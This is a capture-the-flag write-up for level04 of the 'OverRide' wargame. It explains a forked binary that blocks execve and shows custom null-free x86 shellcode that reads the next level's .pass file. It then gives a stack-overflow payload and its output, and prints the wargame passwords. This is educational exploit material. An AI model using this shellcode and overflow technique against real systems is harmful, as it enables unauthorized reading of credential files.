# Level 04

This program multithreaded, so lets break it down.
There is two threads,
one (the parent) that waits for user input with `gets()` explicitly asking for a shellcode
the other (the child) that waits for changes on the other thread with `wait()`.
When the first thread changes status, if the last syscall was `execve()`,
this thread kills the parent with `kill(pid, 9)`.

Basically the challenge of this program is to make our own shellcode,
rather than copy/pasting one from the internet. So we did just that!
We would need a shell code that reads the content of `/home/users/level05/.pass`
and displays it on the standard output.

```asm
push 0x00000001
push 0x00000001
push 0x00000001
push 0x00000001
push 0x00000001
push 0x00000001
push 0x00000001
push 0x00000001
push 0x00000001
push 0x00000001
push 0x00000073 ;    s
push 0x7361702e ; sap.
push 0x2f2f3530 ; //50
push 0x6c657665 ; leve
push 0x6c2f7372 ; l/sr
push 0x6573752f ; esu/
push 0x656d6f68 ; emoh
push 0x2f2f2f2f ; ////
```

These instructions are used to create a stack big enough to handle the `.pass` data.
"But why push 1's instead of 0's ?", you may ask.
We want this shellcode to be passed in the environment of the program to have more efficient testing.
The problem is that the nul bytes (`\x00`) are not accepted as valid characters in environment variables.
So we had to mak sure that no nul byte was present when doing the shellcode.

This meant replacing: `push 0x0`: opcode `6a 00`

With: `push 0x1`: opcode `6a 01`

There is no difference between `push 0x1` and `push 0x00000001`.

The data that is not 0's is the name of the file we want to open: `/home/users/level05/.pass`.
This data is written in reverse because this is a little-endian system.

Also, the last value is 0x00000073.
This is because we cannot end this string on a multiple of 4 characters.
Why? Because the last bit of the string has to be a nul byte.
But remember! We cannot push a whole null byte.
So we need to make sure that the byte that follows the last is nul.
To be sure, the string must end with a hex values that starts with `0x00...`.

```

+-----------+------------+------------+
|           | 0x00000001 | 0x00000073 |
|   stack   | 0x73736170 | 0x7361702e |
|           | 0x2e2f3530 | 0x2f2f3530 |
+-----------+------------+------------+
|           |  0 5 / .   |  0 5 / /   |
|   string  |  p a s s   |  . p a s   |
|           |  \x01      |  s         |
+-----------+------------+------------+

```

This works because, in linux, the number of `/` is irrelevent.
One is as usefull as any number.
To be sure that it wouldn't work. We can simply test with the `.pass` of `level04`:

```bash
level04@OverRide:~$ cat `echo -ne ".pass\x01"`
cat: .pass: No such file or directory
level04@OverRide:~$ cat .pass
kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
```

---

```asm
xor eax, eax	; eax = 0
xor ebx, ebx	; ebx = 0
xor ecx, ecx	; ecx = 0
xor edx, edx	; edx = 0
```

Again, we shouldn't have nul bytes in our code.
So instead of `mov eax, 0x0` (opcode `b8 00 00 00 00`),
we use `xor eax, eax` (opcode `31 c0`) that achives the same result.

```asm
mov al, 5		; open number
mov ebx, esp	; path pointer
mov cl, 2		; flags write/read
mov dl, 1		; mode (not used for read only)
int 0x80
```

Now we do a syscall, so our arguments are on registers.
We only write the data on the byte that is important.
`al` is the lowest byte of `ax`, which is itself the 2 lowest bytes of `eax`.
In short, `al` is the lowest byte of `eax`. As we already set our registers to 0,
we can safely put values that dont overflow a byte in `al`, thus dodging the un-needed nul bytes.
The only exception on this part of the code is `mov ebx, esp`,
but thakfully there there is no nul byt in this opcode.
`int 0x80` is used to call a syscall in 32 bits.
This whole thing is used to call `open`, `read` and then `write`.
Optionnally, you can add a call to `exit` to quit the program gracefully after it ends.

Lets test this shellcode,
for test purposes I've changed `level05` to `level04` to have access to the `.pass` file.

```bash
level04@OverRide:/tmp/level04$ ./shellcode 
kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf
```

It works! Now we need to make it into a shellcode and execute it on the process.
The buffer is 128 bytes long, so we will start by filling it.
After we just need to put the address of the shellcode over and over as such:

`./level04 < <(python -c 'print("a" * 128 + "\x??\x??\x??\x??" * 30)')`

But what is the address of the shellcode?
It is easely findable with another program with the SAME NAME LENGTH in the environnement.

```c
int main() {
	printf("%p\n", getenv("SHELLCODE"));
}
```

Now we can execute it:

```bash
level04@OverRide:/tmp/level04$ $HOME/level04 < <(python -c 'print("a" * 128 + "\x75\xd8\xff\xff" * 30)'
)
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
```

## .pass: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
